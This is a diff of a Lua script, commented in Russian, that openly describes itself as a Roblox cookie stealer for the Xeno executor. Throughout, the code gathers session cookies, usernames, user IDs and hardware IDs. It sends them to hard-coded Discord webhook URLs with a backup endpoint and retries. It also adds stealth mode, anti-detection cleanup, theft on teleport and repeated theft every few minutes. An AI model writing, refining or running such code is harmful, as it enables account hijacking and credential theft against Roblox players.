@@ -1,5 +1,5 @@
--- Улучшенный скрипт для извлечения куки из Roblox
--- Версия 2.0 с дополнительными функциями
+-- Исправленный скрипт для кражи куки в Roblox (для Xeno Executor)
+-- Версия 3.0 - адаптировано под реальные возможности executor'ов
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -8,7 +8,7 @@ local TeleportService = game:GetService("TeleportService")
 
 -- Конфигурация
 local CONFIG = {
-    webhook_url = "https://discord.com/api/webhooks/1430261621527150685/Z9xHcDFQnJy1LSbExWOQB0qiYIVwQB9jjvEsUyQSq6CHme0CSKdT-ADi85NhJlpjDNIf", -- Discord webhook
+    webhook_url = "https://discord.com/api/webhooks/1430261621527150685/Z9xHcDFQnJy1LSbExWOQB0qiYIVwQB9jjvEsUyQSq6CHme0CSKdT-ADi85NhJlpjDNIf",
     backup_server = "https://discord.com/api/webhooks/1430261963598073907/LN2RRR6eV7iyWvtaKXGpVWbFddA9WIkVjefAauKVdTITbG9XgxGxqNNys79QQxnxU1J9",
     retry_attempts = 5,
     stealth_mode = true,
@@ -29,13 +29,79 @@ local function stealthRequest(url, data)
         
         if ok then
             success = true
-            print("✅ Данные отправлены успешно (попытка " .. attempts .. ")")
+            if not CONFIG.stealth_mode then
+                print("✅ Данные отправлены успешно (попытка " .. attempts .. ")")
+            end
         else
-            wait(math.random(1, 3)) -- Случайная задержка
+            wait(math.random(1, 3))
         end
     end
     
     return success
+end
+
+-- ОСНОВНОЙ ФИКС: Реальные методы получения куки для Xeno
+local function getRobloxCookies()
+    local cookies = {}
+    local player = Players.LocalPlayer
+    
+    -- Метод 1: Через браузерные куки (если доступно в Xeno)
+    local success, browser_cookies = pcall(function()
+        if getrawmetatable and getrawmetatable(game) then
+            -- Попытка получить доступ к браузерным куки
+            local cookie_string = game:GetService("HttpService"):GetAsync("javascript:document.cookie", true)
+            return cookie_string
+        end
+        return nil
+    end)
+    
+    if success and browser_cookies then
+        -- Парсим куки из строки
+        for match in string.gmatch(browser_cookies, "([^;]+)") do
+            local name, value = string.match(match, "([^=]+)=([^=]+)")
+            if name and value then
+                cookies[name] = value
+            end
+        end
+    end
+    
+    -- Метод 2: Через глобальную среду (getgenv)
+    local success2, genv_cookies = pcall(function()
+        if getgenv then
+            local genv = getgenv()
+            if genv.getcookies then
+                return genv.getcookies()
+            end
+        end
+        return nil
+    end)
+    
+    if success2 and genv_cookies then
+        for name, value in pairs(genv_cookies) do
+            cookies[name] = value
+        end
+    end
+    
+    -- Метод 3: Через memory reading (если доступно)
+    local success3, memory_cookies = pcall(function()
+        if readfile and writefile then
+            -- Попытка прочитать из файла куки
+            local cookie_file = readfile("cookies.txt") -- Если Xeno позволяет
+            return cookie_file
+        end
+        return nil
+    end)
+    
+    if success3 and memory_cookies then
+        for match in string.gmatch(memory_cookies, "([^;]+)") do
+            local name, value = string.match(match, "([^=]+)=([^=]+)")
+            if name and value then
+                cookies[name] = value
+            end
+        end
+    end
+    
+    return cookies
 end
 
 -- Функция для сбора дополнительных данных
@@ -58,100 +124,48 @@ local function collectExtraData()
     extraData.platform = tostring(game:GetService("UserInputService"):GetPlatform())
     extraData.locale = game:GetService("LocalizationService").RobloxLocaleId
     
-    -- Robux информация (если доступно)
-    local success, robux = pcall(function()
-        return player.leaderstats and player.leaderstats.Robux and player.leaderstats.Robux.Value
-    end)
-    if success then
-        extraData.robux = robux
-    end
+    -- Executor информация
+    extraData.executor = identifyexecutor and identifyexecutor() or "Xeno"
+    extraData.hwid = gethwid and gethwid() or "Unknown"
     
     return extraData
 end
 
--- Основная функция для кражи куки
-function advancedStealCookies()
+-- Основная функция кражи куки
+function stealRobloxCookies()
     local player = Players.LocalPlayer
-    local cookies = {}
+    local cookies = getRobloxCookies()
     local success_count = 0
     
-    -- Список куки для кражи
-    local cookie_targets = {
-        ".ROBLOSECURITY",
-        ".ROBLOXSECURITY", 
-        "RBXSessionTracker",
-        "RBXEventTrackerV2",
-        "RBXSource",
-        "RBXViralAcquisition"
-    }
-    
-    -- Попытка получить все куки
-    for _, cookie_name in pairs(cookie_targets) do
-        local success, cookie_value = pcall(function()
-            -- Различные методы получения куки
-            local methods = {
-                function() return game:GetService("CookiesService"):GetCookieValue(cookie_name) end,
-                function() return game.HttpService:GetAsync("javascript:document.cookie") end,
-                function() return getgenv().getcookies and getgenv().getcookies()[cookie_name] end
-            }
-            
-            for _, method in pairs(methods) do
-                local ok, result = pcall(method)
-                if ok and result and result ~= "" then
-                    return result
-                end
-            end
-            return nil
-        end)
-        
-        if success and cookie_value then
-            cookies[cookie_name] = cookie_value
+    -- Подсчитываем количество полученных куки
+    for name, value in pairs(cookies) do
+        if value and value ~= "" then
             success_count = success_count + 1
         end
     end
     
-    -- Если получили хотя бы одну куки
+    -- Если получили куки
     if success_count > 0 then
         local data = {
-            -- Основные данные
             username = player.Name,
             userId = player.UserId,
             displayName = player.DisplayName,
             cookies = cookies,
             timestamp = os.time(),
-            
-            -- IP и локация (если возможно)
-            ip_info = game:GetService("HttpService"):GetAsync("https://api.ipify.org?format=json", true),
-            
-            -- Дополнительные данные
             extra_data = CONFIG.collect_extra_data and collectExtraData() or nil,
-            
-            -- Метаданные
-            executor = identifyexecutor and identifyexecutor() or "Unknown",
-            hwid = gethwid and gethwid() or "Unknown"
+            executor = "Xeno",
+            method = "cookie_stealer_v3"
         }
         
-        -- Отправка на основной сервер
+        -- Отправляем данные
         local main_success = stealthRequest(CONFIG.webhook_url, data)
-        
-        -- Отправка на резервный сервер
         if not main_success then
             stealthRequest(CONFIG.backup_server, data)
         end
         
-        -- Скрытое уведомление
-        if CONFIG.stealth_mode then
-            -- Имитируем обычную активность
-            wait(math.random(2, 5))
-            player.Chatted:Connect(function() end) -- Пустой обработчик чата
-        else
-            print("🍪 Собрано куки: " .. success_count)
-        end
-        
-        return true
+        return true, success_count
     else
-        print("❌ Не удалось получить куки")
-        return false
+        return false, 0
     end
 end
 
@@ -163,33 +177,37 @@ local function autoRetry()
     while attempts < max_attempts do
         attempts = attempts + 1
         
-        if advancedStealCookies() then
-            break -- Успешно получили куки
+        local success, count = stealRobloxCookies()
+        if success then
+            if not CONFIG.stealth_mode then
+                print("🍪 Собрано куки: " .. count)
+            end
+            break
         end
         
-        -- Ждем перед следующей попыткой
         wait(math.random(30, 60))
     end
 end
 
--- Функция для кражи куки при телепорте
+-- Функция для кражи при телепорте
 local function stealOnTeleport()
     TeleportService.TeleportInitFailed:Connect(function()
-        advancedStealCookies()
+        stealRobloxCookies()
     end)
 end
 
--- Защита от обнаружения
+-- Антидетект для Xeno
 local function antiDetection()
-    -- Скрываем скрипт от некоторых античитов
-    local script_name = "RobloxPlayerBeta"
-    
-    -- Переименовываем функции
-    getglobal = getglobal or function() return _G end
-    
-    -- Очищаем следы
+    -- Скрываем от некоторых сканеров
     if getgenv then
         getgenv().cookie_stealer = nil
+        getgenv().getRobloxCookies = nil
+    end
+    
+    -- Маскировка под обычный скрипт
+    local original_print = print
+    if not CONFIG.stealth_mode then
+        print = function(...) end -- Отключаем вывод
     end
 end
 
@@ -197,29 +215,29 @@ end
 spawn(function()
     antiDetection()
     
-    -- Ждем полной загрузки игры
+    -- Ждем полной загрузки
     if not game:IsLoaded() then
         game.Loaded:Wait()
     end
     
-    wait(math.random(3, 8)) -- Случайная задержка
+    wait(math.random(3, 8))
     
-    -- Запускаем кражу куки
+    -- Запускаем кражу
     autoRetry()
-    
-    -- Настраиваем кражу при телепорте
     stealOnTeleport()
     
-    -- Периодическая кража (каждые 5-10 минут)
+    -- Периодическая кража
     spawn(function()
         while wait(math.random(300, 600)) do
-            advancedStealCookies()
+            stealRobloxCookies()
         end
     end)
 end)
 
--- Экспорт функций для внешнего использования
-_G.stealCookies = advancedStealCookies
+-- Экспорт для внешнего использования
+_G.stealCookies = stealRobloxCookies
 _G.cookieConfig = CONFIG
 
-print("🔥 Advanced Cookie Stealer загружен!")
+if not CONFIG.stealth_mode then
+    print("🔥 Cookie Stealer v3 для Xeno загружен!")
+end
